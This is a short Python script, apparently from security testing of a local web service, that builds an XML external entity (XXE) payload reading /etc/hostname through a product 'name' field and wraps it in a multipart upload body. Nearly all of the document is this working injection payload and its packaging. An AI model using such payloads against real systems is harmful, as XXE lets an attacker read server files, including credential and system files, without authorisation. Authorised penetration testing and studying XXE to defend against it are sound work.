import os
work = r'D:\Backup\Downloads\awa-ddd\work\local-8081-20261106'
xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE products [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<products>
  <product>
    <name>&xxe;</name>
    <price>1.00</price>
    <stock>1</stock>
  </product>
</products>
'''
open(os.path.join(work, 'xxe_test.xml'), 'w', encoding='utf-8', newline='\n').write(xml)
boundary = '----AWAXXE1106'
parts = []
parts.append(('--' + boundary + '\r\n').encode())
parts.append(b'Content-Disposition: form-data; name="file"; filename="xxe-test.xml"\r\n')
parts.append(b'Content-Type: application/xml\r\n\r\n')
parts.append(xml.encode('utf-8'))
parts.append(('\r\n--' + boundary + '--\r\n').encode())
data = b''.join(parts)
open(os.path.join(work, 'xxe_multipart.bin'), 'wb').write(data)
print(len(data), 'boundary', boundary)
